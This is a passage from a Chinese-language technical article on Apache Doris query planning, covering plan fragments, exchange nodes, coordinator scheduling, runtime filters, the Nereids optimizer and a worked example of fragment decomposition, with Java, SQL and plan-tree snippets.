        └── EXCHANGE (接收 Fragment <span class="hljs-number">1</span> 的数据)

Fragment <span class="hljs-number">1</span> (Join &amp; Pre-Aggregation)
    └── VAGGREGATE (update serialize)
        └── HASH JOIN
            ├── OLAP_SCAN (table1) - 左表
            └── EXCHANGE (接收 Fragment <span class="hljs-number">0</span> 的数据) - 右表

Fragment <span class="hljs-number">0</span> (Right Table Scan)
    └── OLAP_SCAN (table2)
</code></pre>
<h3 data-id="heading-15">3.2 PlanFragment 核心设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/PlanFragment.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlanFragment</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PlanFragmentId fragmentId;
    <span class="hljs-keyword">private</span> PlanNode planRoot;              <span class="hljs-comment">// Fragment 的根节点</span>
    <span class="hljs-keyword">private</span> DataPartition dataPartition;    <span class="hljs-comment">// 数据分区方式</span>
    <span class="hljs-keyword">private</span> DataPartition outputPartition;  <span class="hljs-comment">// 输出分区方式</span>
    
    <span class="hljs-comment">// Fragment 的数据接收者</span>
    <span class="hljs-keyword">private</span> DataSink sink;
    
    <span class="hljs-comment">// Fragment 的并行度（实例数）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> numInstances;
    
    <span class="hljs-comment">// Runtime Filter 信息</span>
    <span class="hljs-keyword">private</span> List&lt;RuntimeFilter&gt; targetRuntimeFilters;
    <span class="hljs-keyword">private</span> List&lt;RuntimeFilter&gt; builderRuntimeFilters;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PlanFragment</span><span class="hljs-params">(PlanFragmentId id, PlanNode root, 
                       DataPartition partition)</span> {
        <span class="hljs-built_in">this</span>.fragmentId = id;
        <span class="hljs-built_in">this</span>.planRoot = root;
        <span class="hljs-built_in">this</span>.dataPartition = partition;
        setFragmentInPlanTree(planRoot);
    }
    
    <span class="hljs-comment">// 递归设置所有 PlanNode 的 Fragment ID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFragmentInPlanTree</span><span class="hljs-params">(PlanNode node)</span> {
        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;
        node.setFragmentId(<span class="hljs-built_in">this</span>.fragmentId);
        <span class="hljs-keyword">for</span> (PlanNode child : node.getChildren()) {
            <span class="hljs-keyword">if</span> (child <span class="hljs-keyword">instanceof</span> ExchangeNode) <span class="hljs-keyword">continue</span>;
            setFragmentInPlanTree(child);
        }
    }
}
</code></pre>
<p><strong>Fragment 关键属性</strong>：</p>
<ol>
<li>
<p><strong>planRoot</strong>：Fragment 的执行计划树根节点</p>
</li>
<li>
<p><strong>dataPartition</strong>：数据分区方式（决定如何并行执行）</p>
<ul>
<li><code>UNPARTITIONED</code>：单节点执行</li>
<li><code>RANDOM</code>：随机分区（Round-Robin）</li>
<li><code>HASH_PARTITIONED</code>：按 Hash 分区</li>
<li><code>RANGE_PARTITIONED</code>：按范围分区</li>
</ul>
</li>
<li>
<p><strong>sink</strong>：数据输出目标</p>
<ul>
<li><code>DataStreamSink</code>：发送给其他 Fragment（ExchangeNode）</li>
<li><code>ResultSink</code>：返回给客户端</li>
<li><code>OlapTableSink</code>：写入 OLAP 表（INSERT）</li>
</ul>
</li>
<li>
<p><strong>numInstances</strong>：Fragment 的并行实例数</p>
<ul>
<li>由数据分区和节点数量决定</li>
<li>每个实例处理一部分数据</li>
</ul>
</li>
</ol>
<h3 data-id="heading-16">3.3 ExchangeNode（数据交换节点）</h3>
<p><strong>作用</strong>：连接不同 Fragment，接收其他 Fragment 的输出数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExchangeNode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PlanNode</span> {
    <span class="hljs-keyword">private</span> PlanFragmentId inputFragmentId;  <span class="hljs-comment">// 数据来源 Fragment</span>
    
    <span class="hljs-comment">// Exchange 类型</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ExchangeType</span> {
        MERGING,      <span class="hljs-comment">// 归并排序（保持有序）</span>
        HASH,         <span class="hljs-comment">// Hash 分区</span>
        BROADCAST,    <span class="hljs-comment">// 广播</span>
        PASSTHROUGH   <span class="hljs-comment">// 透传（不重新分区）</span>
    }
}
</code></pre>
<p><strong>Fragment 连接示例</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">Fragment 1: <span class="hljs-section">[OLAP_SCAN]</span> --DataStreamSink--&gt; 
Fragment 2: <span class="hljs-section">[ExchangeNode]</span> --&gt; <span class="hljs-section">[HASH_JOIN]</span>
</code></pre>
<hr/>
<h2 data-id="heading-17">4. 分布式计划生成（How）</h2>
<h3 data-id="heading-18">4.1 分布式计划生成流程</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[单节点逻辑计划] --&gt; B[createPlanFragments]
    B --&gt; C[识别Fragment边界]
    C --&gt; D[为每个Fragment分配并行度]
    D --&gt; E[计算Fragment执行位置]
    E --&gt; F[生成FragmentExecParams]
    F --&gt; G[分配ScanRange到BE]
    G --&gt; H[PlanFragment列表]
</code></pre>
<h3 data-id="heading-19">4.2 Coordinator 的 Fragment 调度</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/qe/Coordinator.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Coordinator</span> {
    <span class="hljs-keyword">private</span> List&lt;PlanFragment&gt; fragments;
    <span class="hljs-keyword">private</span> List&lt;ScanNode&gt; scanNodes;
    
    <span class="hljs-comment">// Fragment 实例信息</span>
    <span class="hljs-keyword">private</span> Map&lt;PlanFragmentId, FragmentExecParams&gt; fragmentExecParamsMap;
    
    <span class="hljs-comment">// Backend 执行实例</span>
    <span class="hljs-keyword">private</span> Map&lt;TNetworkAddress, BackendExecState&gt; backendExecStates;
    
    <span class="hljs-comment">/**
     * 计算 Fragment 的执行位置和并行度
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeFragmentExecParams</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">for</span> (PlanFragment fragment : fragments) {
            <span class="hljs-type">FragmentExecParams</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FragmentExecParams</span>(fragment);
            
            <span class="hljs-comment">// 1. 识别 Fragment 类型</span>
            <span class="hljs-keyword">if</span> (containsScanNode(fragment)) {
                <span class="hljs-comment">// 包含 ScanNode 的 Fragment</span>
                computeScanRangeAssignment(fragment, params);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 不包含 ScanNode 的 Fragment（如聚合、Join 右表）</span>
                computeInstancesForNonScanFragment(fragment, params);
            }
            
            fragmentExecParamsMap.put(fragment.getFragmentId(), params);
        }
    }
    
    <span class="hljs-comment">/**
     * 为包含 ScanNode 的 Fragment 分配 Tablet
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeScanRangeAssignment</span><span class="hljs-params">(
            PlanFragment fragment, FragmentExecParams params)</span> {
        
        <span class="hljs-keyword">for</span> (ScanNode scanNode : fragment.getScanNodes()) {
            <span class="hljs-keyword">if</span> (scanNode <span class="hljs-keyword">instanceof</span> OlapScanNode) {
                <span class="hljs-type">OlapScanNode</span> <span class="hljs-variable">olapScan</span> <span class="hljs-operator">=</span> (OlapScanNode) scanNode;
                
                <span class="hljs-comment">// 获取需要扫描的所有 Tablet</span>
                List&lt;Long&gt; tabletIds = olapScan.getScanTabletIds();
                
                <span class="hljs-keyword">for</span> (Long tabletId : tabletIds) {
                    <span class="hljs-comment">// 获取 Tablet 的副本位置</span>
                    List&lt;Replica&gt; replicas = getTabletReplicas(tabletId);
                    
                    <span class="hljs-comment">// 选择最优副本（考虑负载均衡）</span>
                    <span class="hljs-type">Replica</span> <span class="hljs-variable">selectedReplica</span> <span class="hljs-operator">=</span> selectBestReplica(replicas);
                    <span class="hljs-type">Backend</span> <span class="hljs-variable">backend</span> <span class="hljs-operator">=</span> getBackend(
                        selectedReplica.getBackendId());
                    
                    <span class="hljs-comment">// 分配 ScanRange 到 Backend</span>
                    params.addScanRange(backend, tabletId, scanNode);
                }
            }
        }
    }
    
    <span class="hljs-comment">/**
     * 为不包含 ScanNode 的 Fragment 计算实例数
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeInstancesForNonScanFragment</span><span class="hljs-params">(
            PlanFragment fragment, FragmentExecParams params)</span> {
        
        <span class="hljs-comment">// 根据输入 Fragment 的并行度决定</span>
        <span class="hljs-type">PlanNode</span> <span class="hljs-variable">planRoot</span> <span class="hljs-operator">=</span> fragment.getPlanRoot();
        <span class="hljs-keyword">if</span> (planRoot <span class="hljs-keyword">instanceof</span> ExchangeNode) {
            <span class="hljs-type">ExchangeNode</span> <span class="hljs-variable">exchangeNode</span> <span class="hljs-operator">=</span> (ExchangeNode) planRoot;
            <span class="hljs-type">PlanFragmentId</span> <span class="hljs-variable">inputFragmentId</span> <span class="hljs-operator">=</span> 
                exchangeNode.getInputFragmentId();
            
            <span class="hljs-type">FragmentExecParams</span> <span class="hljs-variable">inputParams</span> <span class="hljs-operator">=</span> 
                fragmentExecParamsMap.get(inputFragmentId);
            
            <span class="hljs-keyword">if</span> (fragment.getDataPartition().isPartitioned()) {
                <span class="hljs-comment">// 需要 Shuffle：每个接收节点创建实例</span>
                params.setInstanceNum(inputParams.getInstanceNum());
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 不需要 Shuffle：单实例汇总</span>
                params.setInstanceNum(<span class="hljs-number">1</span>);
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-20">4.3 FragmentExecParams（Fragment 执行参数）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FragmentExecParams</span> {
    <span class="hljs-keyword">public</span> PlanFragment fragment;
    
    <span class="hljs-comment">// Fragment 的所有执行实例</span>
    <span class="hljs-keyword">public</span> List&lt;FInstanceExecParam&gt; instanceExecParams;
    
    <span class="hljs-comment">/**
     * 单个 Fragment 实例的执行参数
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FInstanceExecParam</span> {
        <span class="hljs-keyword">public</span> TUniqueId instanceId;      <span class="hljs-comment">// 实例 ID</span>
        <span class="hljs-keyword">public</span> TNetworkAddress host;      <span class="hljs-comment">// 执行节点</span>
        
        <span class="hljs-comment">// ScanNode 的扫描范围</span>
        <span class="hljs-keyword">public</span> Map&lt;Integer, List&lt;TScanRangeParams&gt;&gt; perNodeScanRanges;
        
        <span class="hljs-comment">// 接收数据的节点（用于 DataStreamSink）</span>
        <span class="hljs-keyword">public</span> List&lt;TNetworkAddress&gt; destinations;
    }
}
</code></pre>
<p><strong>执行实例分配示例</strong>：</p>
<p>假设有 3 个 BE 节点（BE1、BE2、BE3），扫描的表有 6 个 Tablet：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">Fragment</span> <span class="hljs-number">0</span> <span class="hljs-string">(OLAP_SCAN)</span>
  <span class="hljs-string">├──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">0</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE1:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[0,</span> <span class="hljs-number">3</span><span class="hljs-string">]</span>
  <span class="hljs-string">├──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">1</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE2:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[1,</span> <span class="hljs-number">4</span><span class="hljs-string">]</span>
  <span class="hljs-string">└──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">2</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE3:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[2,</span> <span class="hljs-number">5</span><span class="hljs-string">]</span>

<span class="hljs-string">Fragment</span> <span class="hljs-number">1</span> <span class="hljs-string">(AGGREGATE)</span>
  <span class="hljs-string">├──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">0</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE1:</span> <span class="hljs-string">Receive</span> <span class="hljs-string">from</span> <span class="hljs-string">Fragment</span> <span class="hljs-number">0</span>
  <span class="hljs-string">├──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">1</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE2:</span> <span class="hljs-string">Receive</span> <span class="hljs-string">from</span> <span class="hljs-string">Fragment</span> <span class="hljs-number">0</span>
  <span class="hljs-string">└──</span> <span class="hljs-string">Instance</span> <span class="hljs-number">2</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE3:</span> <span class="hljs-string">Receive</span> <span class="hljs-string">from</span> <span class="hljs-string">Fragment</span> <span class="hljs-number">0</span>
</code></pre>
<hr/>
<h2 data-id="heading-21">5. Runtime Filter 运行时过滤（How）</h2>
<h3 data-id="heading-22">5.1 Runtime Filter 原理</h3>
<p><strong>问题</strong>：Join 操作中，如果能提前知道右表的过滤条件，可以在扫描左表时就过滤掉不匹配的数据。</p>
<p><strong>解决方案</strong>：在右表构建 Hash Table 时生成 Bloom Filter 或 MinMax Filter，下推到左表扫描。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> large_table l
<span class="hljs-keyword">JOIN</span> small_table s <span class="hljs-keyword">ON</span> l.id <span class="hljs-operator">=</span> s.id
<span class="hljs-keyword">WHERE</span> s.category <span class="hljs-operator">=</span> <span class="hljs-string">'electronics'</span>;
</code></pre>
<p><strong>执行流程</strong>：</p>
<ol>
<li>
<p><strong>Build 阶段</strong>：扫描 small_table（右表）</p>
<ul>
<li>过滤 <code>category = 'electronics'</code></li>
<li>提取所有 <code>s.id</code> 构建 Bloom Filter</li>
<li><strong>生成 Runtime Filter</strong></li>
</ul>
</li>
<li>
<p><strong>Probe 阶段</strong>：扫描 large_table（左表）</p>
<ul>
<li><strong>应用 Runtime Filter</strong>：只扫描 <code>l.id IN (Bloom Filter)</code> 的数据</li>
<li>减少扫描数据量和 Join 计算量</li>
</ul>
</li>
<li>
<p><strong>Join 执行</strong>：</p>
<ul>
<li>左表数据已被过滤，Join 速度更快</li>
</ul>
</li>
</ol>
<h3 data-id="heading-23">5.2 Runtime Filter 实现</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/RuntimeFilter.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeFilter</span> {
    <span class="hljs-keyword">private</span> RuntimeFilterId id;
    
    <span class="hljs-comment">// Filter 类型</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">RuntimeFilterType</span> {
        IN_FILTER,           <span class="hljs-comment">// IN 列表过滤</span>
        BLOOM_FILTER,        <span class="hljs-comment">// Bloom Filter</span>
        MIN_MAX_FILTER,      <span class="hljs-comment">// MinMax 范围过滤</span>
        IN_OR_BLOOM_FILTER   <span class="hljs-comment">// IN + Bloom 组合</span>
    }
    
    <span class="hljs-comment">// Build 端（生成 Filter 的节点）</span>
    <span class="hljs-keyword">private</span> PlanNodeId builderNodeId;
    
    <span class="hljs-comment">// Target 端（应用 Filter 的节点列表）</span>
    <span class="hljs-keyword">private</span> List&lt;PlanNodeId&gt; targetNodeIds;
    
    <span class="hljs-comment">// Join 条件表达式</span>
    <span class="hljs-keyword">private</span> Expr srcExpr;      <span class="hljs-comment">// Build 端表达式（如 s.id）</span>
    <span class="hljs-keyword">private</span> List&lt;Expr&gt; targetExprs;  <span class="hljs-comment">// Target 端表达式（如 l.id）</span>
    
    <span class="hljs-comment">// Filter 大小和选择性</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> filterSizeBytes;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> selectivity;
}
</code></pre>
<p><strong>Runtime Filter 生成时机</strong>：</p>
<p>在 HashJoinNode 初始化时，Planner 会分析：</p>
<ol>
<li>Join 条件是否为等值连接</li>
<li>右表（Build 端）是否足够小</li>
<li>左表（Probe 端）是否为 ScanNode</li>
</ol>
<p>如果满足条件，生成 Runtime Filter 并：</p>
<ul>
<li>在右表 ScanNode 添加 <code>builderRuntimeFilter</code></li>
<li>在左表 ScanNode 添加 <code>targetRuntimeFilter</code></li>
</ul>
<h3 data-id="heading-24">5.3 Runtime Filter 下推</h3>
<p><strong>下推到存储层</strong>：</p>
<p>Runtime Filter 可以下推到 BE 的存储引擎：</p>
<ul>
<li><strong>Bloom Filter</strong>：在读取 Segment 时过滤</li>
<li><strong>MinMax Filter</strong>：利用列统计信息（ZoneMap）裁剪数据块</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">OLAP_SCAN</span> (large_table)
  ├── <span class="hljs-selector-tag">conjuncts</span>: <span class="hljs-selector-attr">[l.category = <span class="hljs-string">'active'</span>]</span>
  └── <span class="hljs-selector-tag">runtime_filters</span>: <span class="hljs-selector-attr">[l.id IN BloomFilter(s.id)]</span>
      ↓ (下推到 BE)
      <span class="hljs-selector-tag">Segment</span> 读取时应用 <span class="hljs-selector-tag">Bloom</span> <span class="hljs-selector-tag">Filter</span>
</code></pre>
<hr/>
<h2 data-id="heading-25">6. Nereids Planner vs 传统 Planner（对比）</h2>
<h3 data-id="heading-26">6.1 NereidsPlanner 架构</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/NereidsPlanner.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NereidsPlanner</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Planner</span> {
    <span class="hljs-keyword">protected</span> Plan parsedPlan;       <span class="hljs-comment">// 解析后的逻辑计划</span>
    <span class="hljs-keyword">protected</span> Plan analyzedPlan;     <span class="hljs-comment">// 分析后的逻辑计划</span>
    <span class="hljs-keyword">protected</span> Plan rewrittenPlan;    <span class="hljs-comment">// 重写后的逻辑计划</span>
    <span class="hljs-keyword">protected</span> Plan optimizedPlan;    <span class="hljs-comment">// 优化后的逻辑计划</span>
    <span class="hljs-keyword">protected</span> PhysicalPlan physicalPlan;  <span class="hljs-comment">// 物理计划</span>
    
    <span class="hljs-keyword">private</span> CascadesContext cascadesContext;  <span class="hljs-comment">// Cascades 优化框架</span>
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">plan</span><span class="hljs-params">(StatementBase queryStmt, TQueryOptions queryOptions)</span> 
            <span class="hljs-keyword">throws</span> UserException {
        <span class="hljs-type">LogicalPlan</span> <span class="hljs-variable">parsedPlan</span> <span class="hljs-operator">=</span> logicalPlanAdapter.getLogicalPlan();
        
        <span class="hljs-comment">// 1. 预处理（Hint 处理等）</span>
        plan = preprocess(plan);
        
        <span class="hljs-comment">// 2. 分析（类型推导、名称解析）</span>
        analyze(showAnalyzeProcess);
        
        <span class="hljs-comment">// 3. 重写（规则优化）</span>
        rewrite(showRewriteProcess);
        
        <span class="hljs-comment">// 4. CBO 优化（代价优化）</span>
        optimize(showPlanProcess);
        
        <span class="hljs-comment">// 5. 选择最优物理计划</span>
        <span class="hljs-type">PhysicalPlan</span> <span class="hljs-variable">physicalPlan</span> <span class="hljs-operator">=</span> chooseNthPlan(
            getRoot(), requireProperties, nth);
        
        <span class="hljs-comment">// 6. 后处理（Runtime Filter 生成等）</span>
        physicalPlan = postProcess(physicalPlan);
        
        <span class="hljs-comment">// 7. 分布式计划生成</span>
        distribute(physicalPlan, explainLevel);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">optimize</span><span class="hljs-params">(<span class="hljs-type">boolean</span> showPlanProcess)</span> {
        <span class="hljs-comment">// Cascades 优化器</span>
        <span class="hljs-type">Optimizer</span> <span class="hljs-variable">optimizer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Optimizer</span>(cascadesContext);
        optimizer.optimize();
    }
}
</code></pre>
<h3 data-id="heading-27">6.2 Nereids vs 传统 Planner 对比</h3>























































<table><thead><tr><th>对比维度</th><th>传统 Planner</th><th>NereidsPlanner</th></tr></thead><tbody><tr><td><strong>优化框架</strong></td><td>基于规则的优化（RBO）</td><td>Cascades 框架（CBO）</td></tr><tr><td><strong>代价模型</strong></td><td>简单启发式</td><td>完善的代价模型 + 统计信息</td></tr><tr><td><strong>逻辑计划表示</strong></td><td>AST（StatementBase）</td><td>Plan 树（LogicalPlan）</td></tr><tr><td><strong>物理计划生成</strong></td><td>直接转换</td><td>通过 Memo 搜索最优计划</td></tr><tr><td><strong>Join 顺序优化</strong></td><td>左深树 + 简单调整</td><td>动态规划 + Bushy Tree</td></tr><tr><td><strong>表达式优化</strong></td><td>有限的常量折叠</td><td>完整的表达式重写框架</td></tr><tr><td><strong>子查询处理</strong></td><td>部分 Unnesting</td><td>完整的 Decorrelation</td></tr><tr><td><strong>优化规则</strong></td><td>约 50 个硬编码规则</td><td>300+ 模式匹配规则</td></tr><tr><td><strong>扩展性</strong></td><td>新增规则需修改多处代码</td><td>声明式规则，易于扩展</td></tr></tbody></table>
<h3 data-id="heading-28">6.3 Nereids 优化阶段</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[LogicalPlan] --&gt; B[Analyze分析]
    B --&gt; C[Rewrite重写]
    C --&gt; D[Optimize优化]
    D --&gt; E[PhysicalPlan]
    
    B --&gt; B1[类型推导]
    B --&gt; B2[名称解析]
    B --&gt; B3[子查询Unnesting]
    
    C --&gt; C1[谓词下推]
    C --&gt; C2[列裁剪]
    C --&gt; C3[常量折叠]
    C --&gt; C4[公共表达式消除]
    
    D --&gt; D1[Join顺序优化]
    D --&gt; D2[聚合下推]
    D --&gt; D3[物理算子选择]
    D --&gt; D4[Runtime Filter生成]
</code></pre>
<p><strong>Cascades 框架核心概念</strong>：</p>
<ol>
<li>
<p><strong>Memo</strong>：</p>
<ul>
<li>紧凑存储所有等价表达式</li>
<li>Group：逻辑等价的表达式集合</li>
<li>GroupExpression：具体的表达式实现</li>
</ul>
</li>
<li>
<p><strong>Search Space</strong>：</p>
<ul>
<li>通过规则不断扩展 Memo</li>
<li>生成多种等价的逻辑/物理计划</li>
</ul>
</li>
<li>
<p><strong>Cost-Based Selection</strong>：</p>
<ul>
<li>为每个物理计划估算代价</li>
<li>选择代价最小的计划</li>
</ul>
</li>
</ol>
<p><strong>示例</strong>：Join 顺序优化</p>
<p>传统 Planner：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> A, B, C <span class="hljs-keyword">WHERE</span> A.id <span class="hljs-operator">=</span> B.id <span class="hljs-keyword">AND</span> B.id <span class="hljs-operator">=</span> C.id;
<span class="hljs-comment">-- 固定生成: (A JOIN B) JOIN C</span>
</code></pre>
<p>NereidsPlanner：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 搜索空间包含:</span>
<span class="hljs-comment">-- Option 1: (A JOIN B) JOIN C</span>
<span class="hljs-comment">-- Option 2: (A JOIN C) JOIN B</span>
<span class="hljs-comment">-- Option 3: (B JOIN C) JOIN A</span>
<span class="hljs-comment">-- 根据统计信息和代价模型选择最优</span>
</code></pre>
<hr/>
<h2 data-id="heading-29">7. 查询规划示例</h2>
<h3 data-id="heading-30">7.1 示例查询</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> 
    o.order_date,
    c.customer_name,
    <span class="hljs-built_in">SUM</span>(o.amount) <span class="hljs-keyword">as</span> total_amount
<span class="hljs-keyword">FROM</span> orders o
<span class="hljs-keyword">JOIN</span> customers c <span class="hljs-keyword">ON</span> o.customer_id <span class="hljs-operator">=</span> c.id
<span class="hljs-keyword">WHERE</span> o.order_date <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-01-01'</span>
  <span class="hljs-keyword">AND</span> c.region <span class="hljs-operator">=</span> <span class="hljs-string">'ASIA'</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> o.order_date, c.customer_name
<span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">SUM</span>(o.amount) <span class="hljs-operator">&gt;</span> <span class="hljs-number">1000</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> total_amount <span class="hljs-keyword">DESC</span>
LIMIT <span class="hljs-number">100</span>;
</code></pre>
<h3 data-id="heading-31">7.2 生成的 PlanNode 树</h3>
<pre><code class="hljs language-sql" lang="sql">┌─ <span class="hljs-keyword">RESULT</span> SINK
│
└─ TOP<span class="hljs-operator">-</span>N [LIMIT <span class="hljs-number">100</span>, <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> total_amount <span class="hljs-keyword">DESC</span>]
   │
   └─ VAGGREGATE (<span class="hljs-keyword">merge</span> finalize)
      │   output: <span class="hljs-built_in">SUM</span>(sum_amount)
      │   <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>: order_date, customer_name
      │   <span class="hljs-keyword">having</span>: <span class="hljs-built_in">SUM</span>(sum_amount) <span class="hljs-operator">&gt;</span> <span class="hljs-number">1000</span>
      │
      └─ EXCHANGE [HASH_PARTITIONED: order_date, customer_name]
         │
         └─ VAGGREGATE (<span class="hljs-keyword">update</span> serialize)
            │   output: <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">as</span> sum_amount
            │   <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>: order_date, customer_name
            │
            └─ HASH <span class="hljs-keyword">JOIN</span> [<span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span>]
               │   <span class="hljs-keyword">join</span> <span class="hljs-keyword">condition</span>: o.customer_id <span class="hljs-operator">=</span> c.id
               │   distribution: BROADCAST
               │
               ├─ OLAP_SCAN (orders)
               │   predicates: order_date <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-01-01'</span>
               │   runtime_filters: customer_id <span class="hljs-keyword">IN</span> BloomFilter
               │
               └─ EXCHANGE [BROADCAST]
                  │
                  └─ OLAP_SCAN (customers)
                      predicates: region <span class="hljs-operator">=</span> <span class="hljs-string">'ASIA'</span>
</code></pre>
<h3 data-id="heading-32">7.3 Fragment 分解</h3>
<p><strong>Fragment 0</strong>：扫描 customers 表（右表）</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">PlanRoot:</span> <span class="hljs-string">OLAP_SCAN</span> <span class="hljs-string">(customers)</span>
  <span class="hljs-attr">predicates:</span> <span class="hljs-string">region</span> <span class="hljs-string">=</span> <span class="hljs-string">'ASIA'</span>
  
<span class="hljs-attr">DataSink:</span> <span class="hljs-string">DataStreamSink</span> <span class="hljs-string">(BROADCAST</span> <span class="hljs-string">to</span> <span class="hljs-string">Fragment</span> <span class="hljs-number">2</span><span class="hljs-string">)</span>

<span class="hljs-attr">Instances:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Instance</span> <span class="hljs-number">0</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE1:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[0,3,6]</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Instance</span> <span class="hljs-number">1</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE2:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[1,4,7]</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Instance</span> <span class="hljs-number">2</span> <span class="hljs-string">@</span> <span class="hljs-attr">BE3:</span> <span class="hljs-string">Scan</span> <span class="hljs-string">Tablet[2,5,8]</span>
</code></pre>
<p><strong>Fragment 1</strong>：Result 输出</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">PlanRoot:</span> TOP-N [LIMIT <span class="hljs-number">100</span>]
  ├─ VAGGREGATE (merge finalize)
  └─ EXCHANGE (<span class="hljs-keyword">from</span> Fragment <span class="hljs-number">2</span>)

<span class="hljs-symbol">DataSink:</span> ResultSink (返回给客户端)

<span class="hljs-symbol">Instances:</span>
  - Instance <span class="hljs-number">0</span> @ FE Coordinator (单实例汇总)
</code></pre>
<p><strong>Fragment 2</strong>：扫描 orders 表 + Join + 预聚合</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">PlanRoot:</span> VAGGREGATE (update serialize)
  └─ HASH <span class="hljs-keyword">JOIN</span>
     ├─ OLAP_SCAN (orders)
     │   predicates: order_date &gt;= <span class="hljs-comment">'2024-01-01'</span>
     │   runtime_filters: customer_id <span class="hljs-keyword">IN</span> BloomFilter
     └─ EXCHANGE (<span class="hljs-keyword">from</span> Fragment <span class="hljs-number">0</span>, BROADCAST)

